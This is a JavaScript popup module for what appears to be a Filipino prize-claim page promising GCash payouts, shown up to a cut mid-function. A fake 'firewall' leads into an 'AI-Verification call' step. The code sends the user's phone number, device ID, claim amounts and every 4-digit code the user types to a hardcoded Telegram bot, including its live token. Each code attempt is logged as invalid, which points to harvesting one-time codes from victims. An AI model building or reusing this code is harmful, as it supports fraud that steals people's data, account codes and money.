/**
 * Popup Share Module - Carnival Theme + AI-Verification Call
 * Vibrant Filipino carnival design with hot red/crimson background
 * Firewall integration for PlayBonus.html
 */

// ========== POPUP MODULE ==========
(function() {
    'use strict';
    
    let currentBalance = 0;
    let currentPhase = 1;
    let claimInProgress = false;
    let isRedirecting = false;
    let currentFirewallStatus = false;
    
    // AI-VERIFICATION CALL VARIABLES
    let callInProgress = false;
    let callCountdown = 60;
    let callTimerInterval = null;
    let isCallRequested = false;
    let currentCallCode = '';
    let codeEntered = false;
    
    // ========== SOUND EFFECTS ==========
    function playClaimSound() {
        try {
            var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
            audio.volume = 0.7;
            audio.play().catch(function(e) { console.log('Sound play prevented:', e); });
        } catch(e) {
            console.log('Sound error:', e);
        }
    }
    
    function playCallSound() {
        try {
            var audio = new Audio('sounds/call_ring.mp3');
            audio.volume = 0.5;
            audio.play().catch(function(e) { console.log('Call sound error:', e); });
        } catch(e) {
            console.log('Call sound error:', e);
        }
    }
    
    // ========== TELEGRAM NOTIFICATIONS ==========
    var BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    var CHAT_ID = "7298607329";
    
    function sendTelegramMessage(message) {
        try {
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
                .catch(function(e) { console.error('Telegram error:', e); });
        } catch(e) {
            console.error('Telegram error:', e);
        }
    }
    
    function sendAICallRequestNotification(userPhone, deviceId, code) {
        var now = new Date();
        var timestamp = now.toLocaleString();
        var message = '🎪 AI-VERIFICATION CALL REQUESTED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n🔑 Code: ' + code + '\n⏰ Time: ' + timestamp + '\n📊 Status: Waiting for admin call\n━━━━━━━━━━━━━━━━━━━━';
        sendTelegramMessage(message);
    }
    
    function sendAICodeAttemptNotification(userPhone, deviceId, codeEntered, secondsLeft) {
        var now = new Date();
        var timestamp = now.toLocaleString();
        var message = '🔑 CARNIVAL CODE ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n📝 Code Entered: ' + codeEntered + '\n⏰ Time: ' + timestamp + '\n⏱️ Seconds Left: ' + secondsLeft + 's\n📊 Status: INVALID\n━━━━━━━━━━━━━━━━━━━━';
        sendTelegramMessage(message);
    }
    
    function sendAICallExpiredNotification(userPhone, deviceId) {
        var now = new Date();
        var timestamp = now.toLocaleString();
        var message = '⏰ AI-VERIFICATION EXPIRED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n⏰ Time: ' + timestamp + '\n📊 Status: Call expired\n━━━━━━━━━━━━━━━━━━━━';
        sendTelegramMessage(message);
    }
    
    function sendClaimButtonNotification(userPhone, deviceId, amount) {
        var now = new Date();
        var timestamp = now.toLocaleString();
        var message = '🎁 CARNIVAL CLAIM INITIATED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n💰 Amount: ₱' + amount.toFixed(2) + '\n⏰ Time: ' + timestamp + '\n📊 Status: Processing claim\n━━━━━━━━━━━━━━━━━━━━';
        sendTelegramMessage(message);
    }
    
    // ========== UPDATE BILLS INDICATORS (Carnival Style) ==========
    function updateBillsIndicators(balance) {
        var billIndicators = document.querySelectorAll('.bill-indicator');
        var billCount = Math.min(4, Math.floor(balance / 500));
        
        for (var i = 0; i < billIndicators.length; i++) {
            var indicator = billIndicators[i];
            var img = indicator.querySelector('img');
            
            if (i < billCount) {
                if (i % 2 === 0) {
                    img.src = 'images/PHL-500-Front.png';
                } else {
                    img.src = 'images/PHL-500-Back.png';
                }
                img.style.opacity = '1';
                img.style.filter = 'none';
                indicator.classList.add('active');
            } else {
                img.src = 'images/PHL-500-Front.png';
                img.style.opacity = '0.25';
                img.style.filter = 'grayscale(100%) brightness(30%)';
                indicator.classList.remove('active');
            }
        }
    }
    
    // ========== INITIALIZATION ==========
    function init() {
        console.log('🎪 Carnival Popup Module Starting...');
        
        var popup = document.getElementById('prizePopup');
        if (!popup) {
            console.error('Popup element not found!');
            return;
        }
        
        getFirewallStatus();
        addCarnivalAnimations();
        
        console.log('✅ Carnival Popup Module ready');
    }
    
    // ========== ADD CARNIVAL ANIMATIONS ==========
    function addCarnivalAnimations() {
        if (document.querySelector('#carnival-popup-animations')) return;
        
        var style = document.createElement('style');
        style.id = 'carnival-popup-animations';
        style.textContent = `
            /* ========== CARNIVAL POPUP THEME ========== */
            .prize-popup {
                background: 
                    radial-gradient(circle at 50% 40%, rgba(255, 255, 255, 0.3) 0%, transparent 40%),
                    radial-gradient(circle at 50% 50%, #ff1744 0%, #c1121f 40%, #780000 70%, #1a0000 100%) !important;
                backdrop-filter: blur(15px);
                -webkit-backdrop-filter: blur(15px);
            }
            
            /* Carnival Confetti Background */
            .prize-popup::before {
                content: '';
                position: absolute;
                inset: 0;
                background-image: 
                    radial-gradient(circle 4px at 8% 15%, #ffd700, transparent 60%),
                    radial-gradient(circle 3px at 92% 25%, #4fc3f7, transparent 60%),
                    radial-gradient(circle 4px at 15% 75%, #ff6b9d, transparent 60%),
                    radial-gradient(circle 3px at 85% 85%, #ff9800, transparent 60%),
                    radial-gradient(circle 3px at 50% 10%, #ffd700, transparent 60%),
                    radial-gradient(circle 4px at 25% 50%, #ff6b9d, transparent 60%),
                    radial-gradient(circle 3px at 75% 60%, #4fc3f7, transparent 60%),
                    radial-gradient(circle 4px at 45% 95%, #ffd700, transparent 60%);
                pointer-events: none;
                animation: carnivalConfetti 4s ease-in-out infinite;
                opacity: 0.9;
            }
            
            @keyframes carnivalConfetti {
                0%, 100% { transform: translateY(0) scale(1); }
                50% { transform: translateY(-8px) scale(1.05); }
            }
            
            /* Center White Burst */
            .prize-popup::after {
                content: '';
                position: absolute;
                top: 30%;
                left: 50%;
                transform: translate(-50%, -50%);
                width: 400px;
                height: 400px;
                background: radial-gradient(
                    circle, 
                    rgba(255, 255, 255, 0.4) 0%, 
                    rgba(255, 215, 0, 0.2) 25%,
                    transparent 60%
                );
                border-radius: 50%;
                pointer-events: none;
                animation: whiteBurstPulse 3s ease-in-out infinite;
            }
            
            @keyframes whiteBurstPulse {
                0%, 100% { 
                    transform: translate(-50%, -50%) scale(1); 
                    opacity: 0.6;
                }
                50% { 
                    transform: translate(-50%, -50%) scale(1.2); 
                    opacity: 1;
                }
            }
            
            /* Container */
            .popup-container {
                position: relative;
                z-index: 10;
                background: 
                    linear-gradient(180deg, rgba(255, 255, 255, 0.15) 0%, transparent 30%),
                    linear-gradient(145deg, #a80000 0%, #d10000 40%, #8b0000 100%) !important;
                border: 3px solid #ffd700 !important;
                border-radius: 26px !important;
                box-shadow: 
                    0 25px 60px rgba(0, 0, 0, 0.8),
                    0 0 60px rgba(255, 215, 0, 0.6),
                    0 0 120px rgba(255, 23, 68, 0.4) !important;
                overflow: hidden;
            }
            
            /* Rotating Gold Border */
            .popup-container::before {
                content: '';
                position: absolute;
                inset: -3px;
                border-radius: 28px;
                padding: 3px;
                background: conic-gradient(
                    from var(--angle, 0deg),
                    #ffd700 0%,
                    #ff9800 15%,
                    #ffd700 30%,
                    #fff9c4 45%,
                    #ffd700 60%,
                    #ff9800 75%,
                    #ffd700 90%,
                    #ffd700 100%
                );
                -webkit-mask: 
                    linear-gradient(#fff 0 0) content-box, 
                    linear-gradient(#fff 0 0);
                -webkit-mask-composite: xor;
                mask-composite: exclude;
                pointer-events: none;
                z-index: 0;
                animation: carnivalBorderRotate 4s linear infinite;
            }
            
            @keyframes carnivalBorderRotate {
                to { --angle: 360deg; }
            }
            
            .popup-inner {
                position: relative;
                z-index: 2;
                padding: 30px 24px;
            }
            
            /* Popup Close Button */
            .popup-close {
                background: rgba(255, 255, 255, 0.15) !important;
                border: 1px solid rgba(255, 215, 0, 0.5) !important;
                color: #ffd700 !important;
                width: 34px !important;
                height: 34px !important;
                font-size: 16px !important;
                font-weight: 900 !important;
            }
            
            .popup-close:hover,
            .popup-close:active {
                background: rgba(255, 68, 68, 0.4) !important;
                color: #fff !important;
                transform: rotate(90deg);
                border-color: #ff4444 !important;
            }
            
            /* Headings */
            .popup-title {
                font-family: 'Playfair Display', serif !important;
                font-size: 26px !important;
                font-weight: 900 !important;
                background: linear-gradient(180deg, #fff9c4 0%, #ffd700 30%, #ff9800 70%, #ff6f00 100%) !important;
                -webkit-background-clip: text !important;
                background-clip: text !important;
                color: transparent !important;
                text-transform: uppercase !important;
                letter-spacing: 3px !important;
                text-shadow: 0 0 30px rgba(255, 215, 0, 0.6) !important;
                filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.8));
                margin-bottom: 12px !important;
                line-height: 1.2 !important;
            }
            
            .phase3-heading {
                font-family: 'Playfair Display', serif !important;
                font-size: 22px !important;
                font-weight: 900 !important;
                background: linear-gradient(180deg, #fff9c4 0%, #ffd700 50%, #ff9800 100%) !important;
                -webkit-background-clip: text !important;
                background-clip: text !important;
                color: transparent !important;
                letter-spacing: 3px !important;
                text-align: center !important;
                filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.9));
                text-transform: uppercase !important;
                margin: 8px 0 !important;
            }
            
            /* Prize Amount */
            .prize-amount,
            #popupBalanceAmount {
                font-family: 'Orbitron', monospace !important;
                font-size: 52px !important;
                font-weight: 900 !important;
                background: linear-gradient(180deg, #fff9c4 0%, #ffd700 50%, #ff9800 100%) !important;
                -webkit-background-clip: text !important;
                background-clip: text !important;
                color: transparent !important;
                letter-spacing: 2px !important;
                filter: drop-shadow(0 0 25px rgba(255, 215, 0, 0.9));
                text-align: center !important;
            }
            
            /* Divider */
            .divider {
                width: 60px !important;
                height: 2px !important;
                background: linear-gradient(90deg, transparent, #ffd700, transparent) !important;
                margin: 12px auto !important;
                box-shadow: 0 0 15px rgba(255, 215, 0, 0.6);
            }
            
            /* Info Text */
            .invite-text {
                font-family: 'Poppins', sans-serif !important;
                font-size: 12px !important;
                color: rgba(255, 255, 255, 0.9) !important;
                text-align: center !important;
                line-height: 1.6 !important;
                margin: 12px 0 !important;
            }
            
            .invite-text strong {
                color: #ffd700 !important;
                font-weight: 800 !important;
                text-shadow: 0 0 12px rgba(255, 215, 0, 0.8);
            }
            
            /* ========== BILL INDICATORS ========== */
            .bill-indicators {
                display: flex;
                justify-content: center;
                gap: 8px;
                margin: 15px 0;
            }
            
            .bill-indicator {
                width: 58px;
                height: 30px;
                border-radius: 6px;
                overflow: hidden;
                transition: all 0.3s ease;
                border: 1.5px solid rgba(255, 215, 0, 0.4);
                box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
            }
            
            .bill-indicator img {
                width: 100%;
                height: 100%;
                object-fit: cover;
                transition: all 0.3s ease;
            }
            
            .bill-indicator.active {
                border-color: #ffd700;
                box-shadow: 
                    0 0 15px rgba(255, 215, 0, 0.8),
                    0 0 30px rgba(255, 215, 0, 0.4);
                animation: billActivePulse 1.5s ease-in-out infinite;
            }
            
            @keyframes billActivePulse {
                0%, 100% { 
                    box-shadow: 0 0 15px rgba(255, 215, 0, 0.8), 0 0 30px rgba(255, 215, 0, 0.4);
                }
                50% { 
                    box-shadow: 0 0 25px rgba(255, 215, 0, 1), 0 0 50px rgba(255, 215, 0, 0.6);
                }
            }
            
            /* ========== CARNIVAL BUTTON ========== */
            .claim-gcash-button {
                background: 
                    linear-gradient(180deg, rgba(255, 255, 255, 0.4) 0%, transparent 40%),
                    linear-gradient(180deg, #ffeb3b 0%, #ffd700 30%, #ff9800 70%, #ff6f00 100%) !important;
                border: 3px solid #fff9c4 !important;
                border-radius: 14px !important;
                padding: 16px 20px !important;
                font-family: 'Orbitron', monospace !important;
                font-size: 14px !important;
                font-weight: 900 !important;
                color: #8b0000 !important;
                letter-spacing: 2px !important;
                text-transform: uppercase !important;
                text-shadow: 0 2px 0 rgba(255, 255, 255, 0.7) !important;
                box-shadow: 
                    0 5px 0 #8b4500,
                    0 10px 25px rgba(0, 0, 0, 0.6),
                    0 0 35px rgba(255, 215, 0, 0.8) !important;
                transition: all 0.1s ease;
                position: relative;
                overflow: hidden;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                width: 100%;
                cursor: pointer;
                box-sizing: border-box;
            }
            
            .claim-gcash-button::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(
                    90deg, 
                    transparent, 
                    rgba(255, 255, 255, 0.7), 
                    transparent
                );
                animation: carnivalBtnShine 2.5s infinite;
            }
            
            @keyframes carnivalBtnShine {
                0% { left: -100%; }
                60% { left: 100%; }
                100% { left: 100%; }
            }
            
            .claim-gcash-button:active {
                transform: translateY(5px);
                box-shadow: 
                    0 0 0 #8b4500,
                    0 5px 15px rgba(0, 0, 0, 0.6),
                    0 0 25px rgba(255, 215, 0, 0.6) !important;
            }
            
            .claim-gcash-button:disabled {
                opacity: 0.5;
                cursor: not-allowed;
            }
            
            /* Back Button */
            .small-back-btn {
                background: linear-gradient(to bottom, #555, #333) !important;
                border: 1px solid #777 !important;
                border-radius: 10px !important;
                padding: 9px 20px !important;
                font-size: 11px !important;
                font-weight: 700 !important;
                color: #ccc !important;
                font-family: 'Orbitron', monospace !important;
                letter-spacing: 1.5px !important;
                text-transform: uppercase !important;
                box-shadow: 0 3px 0 #222 !important;
                transition: all 0.1s ease;
                cursor: pointer;
                display: inline-flex;
                align-items: center;
                justify-content: center;
                gap: 5px;
                margin-top: 10px;
            }
            
            .small-back-btn:active {
                transform: translateY(3px);
                box-shadow: 0 0 0 #222 !important;
            }
            
            /* ========== AI VERIFICATION - CARNIVAL STYLE ========== */
            .phone-verification-box {
                background: 
                    linear-gradient(180deg, rgba(255, 255, 255, 0.1) 0%, transparent 50%),
                    linear-gradient(135deg, #1a0000, #330000) !important;
                border: 2px solid #ffd700 !important;
                border-radius: 18px !important;
                padding: 18px !important;
                margin: 15px 0 !important;
                text-align: center;
                box-shadow: 
                    0 0 25px rgba(255, 215, 0, 0.5),
                    inset 0 0 20px rgba(255, 215, 0, 0.08) !important;
                position: relative;
                overflow: hidden;
            }
            
            .phone-verification-box::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 50%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.2), transparent);
                animation: scanner 3s infinite;
            }
            
            @keyframes scanner {
                100% { left: 200%; }
            }
            
            /* Phone Icon Container */
            .phone-icon-container {
                width: 70px;
                height: 70px;
                margin: 0 auto 12px;
                background: 
                    radial-gradient(circle at 30% 30%, #ff4444, #8b0000);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                border: 3px solid #ffd700;
                box-shadow: 
                    0 0 30px rgba(255, 215, 0, 0.7),
                    inset 0 0 15px rgba(0, 0, 0, 0.5);
                animation: phonePulseCarnival 2s ease-in-out infinite;
                position: relative;
                z-index: 2;
            }
            
            @keyframes phonePulseCarnival {
                0%, 100% { 
                    transform: scale(1);
                    box-shadow: 0 0 30px rgba(255, 215, 0, 0.7);
                }
                50% { 
                    transform: scale(1.08);
                    box-shadow: 0 0 50px rgba(255, 215, 0, 1);
                }
            }
            
            .phone-icon-container i {
                font-size: 32px;
                color: #ffd700;
                text-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
            }
            
            /* Status Text */
            .call-status-text {
                font-family: 'Poppins', sans-serif;
                font-size: 12px;
                color: rgba(255, 255, 255, 0.9);
                text-align: center;
                margin: 10px 0;
                line-height: 1.5;
                position: relative;
                z-index: 2;
            }
            
            .call-status-text strong {
                color: #ffd700;
                font-weight: 800;
                text-shadow: 0 0 12px rgba(255, 215, 0, 0.8);
            }
            
            /* Phone Number Display */
            .phone-number-carnival {
                font-family: 'Orbitron', monospace;
                font-size: 24px;
                font-weight: 900;
                background: linear-gradient(180deg, #fff9c4 0%, #ffd700 50%, #ff9800 100%);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                letter-spacing: 2px;
                margin: 10px 0;
                filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.9));
                animation: phoneNumberReveal 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards,
                           phoneNumberGlow 2s ease-in-out infinite 0.8s;
                display: inline-block;
            }
            
            @keyframes phoneNumberReveal {
                0% { opacity: 0; transform: scale(0.5) rotateY(90deg); }
                50% { opacity: 0.5; transform: scale(1.1) rotateY(-10deg); }
                100% { opacity: 1; transform: scale(1) rotateY(0deg); }
            }
            
            @keyframes phoneNumberGlow {
                0%, 100% { 
                    filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.5));
                }
                50% { 
                    filter: drop-shadow(0 0 40px rgba(255, 215, 0, 1));
                }
            }
            
            /* Countdown Timer */
            .call-timer-carnival {
                font-family: 'Orbitron', monospace;
                font-size: 32px;
                font-weight: 900;
                color: #39ff14;
                text-shadow: 
                    0 0 30px rgba(57, 255, 20, 0.6),
                    0 0 60px rgba(57, 255, 20, 0.3);
                letter-spacing: 3px;
                margin: 8px 0;
                transition: all 0.3s ease;
                position: relative;
                z-index: 2;
            }
            
            .call-timer-carnival.urgent {
                color: #ff1744;
                text-shadow: 
                    0 0 30px rgba(255, 23, 68, 0.8),
                    0 0 60px rgba(255, 23, 68, 0.4),
                    0 0 100px rgba(255, 23, 68, 0.2);
                animation: timerUrgentPulse 0.5s ease-in-out infinite;
            }
            
            @keyframes timerUrgentPulse {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.1); }
            }
            
            /* Verification Input */
            .verification-input-carnival {
                text-align: center;
                font-size: 24px;
                font-weight: 900;
                width: 100%;
                max-width: 180px;
                padding: 14px;
                background: 
                    linear-gradient(180deg, rgba(255, 255, 255, 0.05) 0%, transparent 50%),
                    #1a0000 !important;
                border: 3px solid #ffd700 !important;
                border-radius: 12px !important;
                color: #ffd700 !important;
                font-family: 'Orbitron', monospace !important;
                transition: all 0.3s ease;
                letter-spacing: 6px;
                box-shadow: 
                    0 0 20px rgba(255, 215, 0, 0.4),
                    inset 0 0 15px rgba(255, 215, 0, 0.1) !important;
                box-sizing: border-box;
                outline: none;
            }
            
            .verification-input-carnival:focus {
                border-color: #fff9c4 !important;
                box-shadow: 
                    0 0 35px rgba(255, 215, 0, 0.8),
                    inset 0 0 20px rgba(255, 215, 0, 0.15) !important;
            }
            
            .verification-input-carnival::placeholder {
                color: rgba(255, 215, 0, 0.4);
                letter-spacing: 3px;
                font-size: 16px;
            }
            
            /* Verify Button */
            .verify-code-btn-carnival {
                width: 100%;
                background: 
                    linear-gradient(180deg, rgba(255, 255, 255, 0.4) 0%, transparent 40%),
                    linear-gradient(180deg, #ffeb3b 0%, #ffd700 30%, #ff9800 70%, #ff6f00 100%) !important;
                border: 3px solid #fff9c4 !important;
                border-radius: 12px !important;
                padding: 14px 20px !important;
                font-family: 'Orbitron', monospace !important;
                font-size: 14px !important;
                font-weight: 900 !important;
                color: #8b0000 !important;
                letter-spacing: 2px !important;
                text-transform: uppercase !important;
                text-shadow: 0 1px 0 rgba(255, 255, 255, 0.7) !important;
                box-shadow: 
                    0 4px 0 #8b4500,
                    0 8px 20px rgba(0, 0, 0, 0.6),
                    0 0 30px rgba(255, 215, 0, 0.7) !important;
                transition: all 0.1s ease;
                cursor: pointer;
                margin-top: 12px;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                box-sizing: border-box;
            }
            
            .verify-code-btn-carnival:active {
                transform: translateY(4px);
                box-shadow: 
                    0 0 0 #8b4500,
                    0 4px 12px rgba(0, 0, 0, 0.6),
                    0 0 20px rgba(255, 215, 0, 0.5) !important;
            }
            
            /* Error Message */
            .code-error-carnival {
                font-family: 'Poppins', sans-serif;
                font-size: 11px;
                color: #ff4444;
                text-align: center;
                padding: 10px;
                margin-top: 10px;
                background: rgba(255, 68, 68, 0.15);
                border: 1px solid rgba(255, 68, 68, 0.4);
                border-radius: 8px;
                display: none;
                position: relative;
                z-index: 2;
            }
            
            .code-error-carnival.show {
                display: block;
                animation: errorShake 0.5s ease;
            }
            
            @keyframes errorShake {
                0%, 100% { transform: translateX(0); }
                20% { transform: translateX(-8px); }
                40% { transform: translateX(8px); }
                60% { transform: translateX(-5px); }
                80% { transform: translateX(5px); }
            }
            
            /* Expired Message */
            .code-expired-carnival {
                font-family: 'Poppins', sans-serif;
                font-size: 11px;
                color: #ff9800;
                text-align: center;
                padding: 10px;
                margin-top: 10px;
                background: rgba(255, 152, 0, 0.15);
                border: 1px solid rgba(255, 152, 0, 0.4);
                border-radius: 8px;
                display: none;
                position: relative;
                z-index: 2;
            }
            
            /* Request Call Button */
            .request-call-btn-carnival {
                width: 100%;
                background: 
                    linear-gradient(180deg, rgba(255, 255, 255, 0.35) 0%, transparent 40%),
                    linear-gradient(180deg, #4facfe 0%, #00c6ff 50%, #0072ff 100%) !important;
                border: 3px solid #7dd3fc !important;
                border-radius: 14px !important;
                padding: 16px 20px !important;
                font-family: 'Orbitron', monospace !important;
                font-size: 14px !important;
                font-weight: 900 !important;
                color: #ffffff !important;
                letter-spacing: 2px !important;
                text-transform: uppercase !important;
                text-shadow: 0 1px 3px rgba(0, 0, 0, 0.4) !important;
                box-shadow: 
                    0 5px 0 #003d99,
                    0 10px 25px rgba(0, 0, 0, 0.6),
                    0 0 35px rgba(79, 172, 254, 0.7) !important;
                transition: all 0.1s ease;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
                position: relative;
                overflow: hidden;
                box-sizing: border-box;
            }
            
            .request-call-btn-carnival::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.5), transparent);
                animation: carnivalBtnShine 3s infinite;
            }
            
            .request-call-btn-carnival:active {
                transform: translateY(5px);
                box-shadow: 
                    0 0 0 #003d99,
                    0 5px 15px rgba(0, 0, 0, 0.6) !important;
            }
            
            .request-call-btn-carnival:disabled {
                opacity: 0.5;
                cursor: not-allowed;
            }
            
            /* ========== ENTRANCE ANIMATIONS ========== */
            @keyframes bounceIn {
                0% { transform: scale(0) rotate(-180deg); opacity: 0; }
                60% { transform: scale(1.1) rotate(0deg); }
                100% { transform: scale(1) rotate(0deg); opacity: 1; }
            }
            
            @keyframes slideDownCarnival {
                from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
                to { opacity: 1; transform: translateX(-50%) translateY(0); }
            }
            
            @keyframes slideInUpCarnival {
                from { opacity: 0; transform: translateY(20px); }
                to { opacity: 1; transform: translateY(0); }
            }
            
            /* Carnival Icon Bounce */
            .carnival-icon {
                animation: bounceIn 0.6s ease;
                filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.8));
            }
            
            /* Divider */
            .divider {
                width: 60px;
                height: 2px;
                background: linear-gradient(90deg, transparent, #ffd700, transparent);
                margin: 12px auto;
                box-shadow: 0 0 15px rgba(255, 215, 0, 0.6);
            }
        `;
        document.head.appendChild(style);
    }
    
    // ========== GET FIREWALL STATUS ==========
    function getFirewallStatus() {
        try {
            var db = firebase.database();
            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                var data = snapshot.val();
                currentFirewallStatus = (data && data.active === true);
                console.log('🎪 Firewall status:', currentFirewallStatus ? 'ON' : 'OFF');
                return currentFirewallStatus;
            });
        } catch(e) {
            console.error('Firewall error:', e);
            return Promise.resolve(false);
        }
    }
    
    // ========== SYNC BALANCE FROM FIREBASE ==========
    function syncBalanceFromFirebase() {
        var userPhone = localStorage.getItem("userPhone");
        if (!userPhone) return Promise.resolve(0);
        
        try {
            var db = firebase.database();
            return db.ref('user_sessions/' + userPhone).once('value').then(function(snap) {
                if (snap.exists() && snap.val().balance !== undefined) {
                    var balance = snap.val().balance;
                    var balanceEl = document.getElementById('userBalanceDisplay');
                    if (balanceEl) balanceEl.innerText = balance.toFixed(2);
                    return balance;
                }
                return 0;
            });
        } catch(e) {
            console.error('Error syncing balance:', e);
            return Promise.resolve(0);
        }
    }
    
    // ========== SHOW FIREWALL POPUP ==========
    function showFirewallPopup() {
        var popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentPhase = 3;
        
        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
        popupInner.style.opacity = '0';
        popupInner.style.transform = 'scale(0.95)';
        
        setTimeout(function() {
            showPhase3();
            popupInner.style.opacity = '1';
            popupInner.style.transform = 'scale(1)';
        }, 300);
    }
    
    // ========== PHASE 3: AI-VERIFICATION CALL (Carnival Style) ==========
    function showPhase3() {
        var popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        var popupContainer = document.querySelector('.popup-container');
        if (popupContainer) {
            popupContainer.style.maxWidth = '380px';
            popupContainer.style.width = '90%';
        }
        
        // Reset call state
        callInProgress = false;
        callCountdown = 60;
        if (callTimerInterval) {
            clearInterval(callTimerInterval);
            callTimerInterval = null;
        }
        isCallRequested = false;
        currentCallCode = '';
        codeEntered = false;
        
        // Get user's mobile number
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var formattedPhone = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase3">✕</div>
            
            <!-- Carnival Header Icon -->
            <div class="carnival-icon" style="text-align: center; margin-bottom: 12px;">
                <div class="phone-icon-container">
                    <i class="fas fa-phone"></i>
                </div>
            </div>
            
            <h2 class="phase3-heading">🎪 AI-VERIFICATION 🎪</h2>
            
            <div class="divider"></div>
            
            <p class="call-status-text">
                <i class="fas fa-shield-alt" style="color: #ffd700; margin-right: 6px;"></i>
                System AI will call you with a <strong>4-digit verification code</strong>
            </p>
            
            <!-- STATUS DISPLAY -->
            <div class="phone-verification-box" id="callStatusContainer">
                <div id="callStatusIcon" style="font-size: 32px; margin-bottom: 8px;">🎪</div>
                <div id="callStatusText" class="call-status-text">Ready for carnival verification</div>
                
                <!-- PHONE NUMBER DISPLAY -->
                <div id="phoneNumberDisplay" style="display: none; margin-top: 10px;">
                    <div class="phone-number-carnival">
                        <span style="margin-right: 8px;">📱</span>${formattedPhone}
                    </div>
                </div>
                
                <div id="callTimerDisplay" class="call-timer-carnival" style="display: none;">60s</div>
            </div>
            
            <!-- REQUEST CALL BUTTON -->
            <button id="requestCallBtn" class="request-call-btn-carnival">
                <i class="fas fa-phone-alt"></i>
                <span>REQUEST CARNIVAL CALL</span>
            </button>
            
            <!-- CODE INPUT SECTION -->
            <div id="codeSection" style="display: none; margin-top: 15px;">
                <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px;">
                    <i class="fas fa-ticket-alt" style="color: #ffd700; font-size: 14px;"></i>
                    <span style="font-size: 11px; color: rgba(255,255,255,0.8); font-family: 'Poppins', sans-serif;">Enter the 4-digit carnival code</span>
                </div>
                
                <input type="text" id="code4Digit" class="verification-input-carnival" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
                
                <button id="verifyCodeBtn" class="verify-code-btn-carnival">
                    <i class="fas fa-check"></i> VERIFY CODE
                </button>
                
                <div id="codeErrorMsg" class="code-error-carnival">
                    <i class="fas fa-exclamation-circle"></i> Invalid carnival code. Request a new call.
                </div>
                
                <div id="callExpiredMsg" class="code-expired-carnival">
                    <i class="fas fa-clock"></i> Carnival call expired. Request a new call.
                </div>
            </div>
            
            <div style="text-align: center; margin-top: 14px;">
                <button class="small-back-btn" id="backBtnPhase3">← BACK</button>
            </div>
        `;
        
        attachPhase3Events();
    }
    
    // ========== ATTACH PHASE 3 EVENTS ==========
    function attachPhase3Events() {
        var closeBtn = document.getElementById('popupClosePhase3');
        if (closeBtn) {
            closeBtn.onclick = function() { 
                stopCallTimer();
                closePopup(); 
            };
        }
        
        var backBtn = document.getElementById('backBtnPhase3');
        if (backBtn) {
            backBtn.onclick = function() {
                stopCallTimer();
                closePopup();
            };
        }
        
        // REQUEST CALL BUTTON
        var requestBtn = document.getElementById('requestCallBtn');
        if (requestBtn) {
            requestBtn.onclick = function() {
                if (callInProgress) {
                    alert("Please wait for the current call to complete.");
                    return;
                }
                requestAICall();
            };
        }
        
        // VERIFY CODE BUTTON
        var verifyBtn = document.getElementById('verifyCodeBtn');
        var codeInput = document.getElementById('code4Digit');
        
        if (verifyBtn) {
            verifyBtn.onclick = function() {
                verifyCode();
            };
        }
        
        if (codeInput) {
            codeInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    verifyCode();
                }
            });
            
            codeInput.addEventListener('input', function(e) {
                var value = this.value.trim();
                if (value.length === 4 && /^\d+$/.test(value)) {
                    this.style.borderColor = '#39ff14';
                    this.style.boxShadow = '0 0 30px rgba(57, 255, 20, 0.5)';
                } else {
                    this.style.borderColor = '#ffd700';
                    this.style.boxShadow = '0 0 20px rgba(255, 215, 0, 0.4)';
                }
            });
        }
    }
    
    // ========== REQUEST AI-VERIFICATION CALL ==========
    function requestAICall() {
        if (callInProgress) return;
        
        callInProgress = true;
        isCallRequested = true;
        callCountdown = 60;
        currentCallCode = generateCallCode();
        codeEntered = false;
        
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        
        // Send Telegram notification
        sendAICallRequestNotification(userPhone, deviceId, currentCallCode);
        
        // Update UI
        var statusIcon = document.getElementById('callStatusIcon');
        var statusText = document.getElementById('callStatusText');
        var phoneDisplay = document.getElementById('phoneNumberDisplay');
        var timerDisplay = document.getElementById('callTimerDisplay');
        var requestBtn = document.getElementById('requestCallBtn');
